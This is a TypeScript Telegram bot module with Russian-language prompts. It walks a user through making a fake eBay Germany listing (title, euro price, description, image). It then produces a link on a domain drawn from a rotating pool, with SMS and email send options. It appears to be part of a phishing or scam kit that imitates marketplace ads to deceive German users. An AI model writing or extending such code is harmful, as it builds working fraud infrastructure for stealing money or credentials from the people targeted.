import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {Ads} from "@/database/models/ads";
import {adsRepository, domensRepository} from "@/database";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import moment from "moment/moment";
import {User} from "@/database/models/user";

export const composer = new Composer<Context>()
const regex = /^ad manual creation (?<service>\w+-\w+)/gmi
composer.callbackQuery(regex, startScene)

async function startScene(ctx: Context) {
    return ctx.scenes.enter('manualCreationAd')
}

export const scene = new Scene<Context>('manualCreationAd')

async function cancel (ctx) {
    await deleteAllMessages(ctx.session.deleteMessage,ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel manualCreationAd', cancel)

scene.do(async (ctx) => {
    ctx.session.createAdManual = {}
    ctx.session.deleteMessage = []
    ctx.session.service = regex.exec(ctx.callbackQuery.data).groups.platform

    const res = await ctx.reply(`<b>🇩🇪 Введи название товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)
    ctx.session.tgId = res.message_id
    ctx.scene.resume()
})

scene.wait().hears(/(^.+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.createAdManual.title = ctx.message.text

    const res = await ctx.reply(`<b>💶 Введи цену товара (только цифры):</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.scene.resume()
})

scene.wait().hears(/(^\d+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)


    ctx.session.createAdManual.price = ctx.match[1] + ' €'

    const res = await ctx.reply(`<b>💬 Введи описание товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.scene.resume()
})

scene.wait().hears(/(^.+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.createAdManual.description = ctx.msg.text

    const res = await ctx.reply(`<b>🌌 Введи ссылку на изображение (воспользуйся @imgur_linkbot):</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.session.tgId = res.message_id
    ctx.scene.resume()
})

scene.wait().hears(/(^.+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    ctx.session.createAdManual.img = ctx.match[1]
    ctx.scene.resume()
})

scene.do(async ctx => {
    try { } catch (e) {}

    const date = Date.now()
    const ad = new Ads()
    ad.price = ctx.session.createAdManual.price
    ad.title = ctx.session.createAdManual.title
    ad.description = ctx.session.createAdManual.description
    ad.img = ctx.session.createAdManual.img
    ad.link = `s-anzeige/zuchtstute-praemienstute/2333383018-${date}`
    ad.originallink = 'none'
    ad.date = `${date}`
    ad.country = 'de'
    ad.service = 'ebay'
    ad.author = ctx.user
    ad.manualCreation = true
    await adsRepository.save(ad)

    const domen = await domensRepository.findOneBy({active: true, service: `ebay`, country: 'de'})
    if (!domen) return ctx.reply('domen undefined error')

    await ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption:`
${(ad) ? '🪄 Ссылка создана!' : '🪄 Ссылка была создана ранее!'}

🐨 ID объявления: <code>${ad.date}</code>

🌳 <b>Название:</b> <code>${ad.title}</code>
🌳 <b>Цена:</b> <code>${ad.price}</code>
🌳 <b>Платформа: [EBAY DE 🇩🇪]</b>
♻️ <b>Домен сменён ${moment(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
💠 <b>Созданная ссылка:</b> <a href="https://${domen.link}/link/${ad.link}">LINK [2.0]</a>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ad.id, ctx.user)
    })
    ctx.scene.exit()
})

const createKeyboard = async (id: Number, user: User) => {
    const keyb = new InlineKeyboard()
    // .text("🙊 Настройки", `settings ad ${id}`)

    keyb.row()

    keyb.text("📲 SMS", `sms ad ${id}`)
    keyb.text("💌 EMAIL", `email ad ${id}`)

    keyb.row()
    keyb.text("⚙ Настройки", `settings ad ${id}`)
    keyb.row()
    keyb.text("Главное меню", `menuWithPicture`)

    return keyb

}
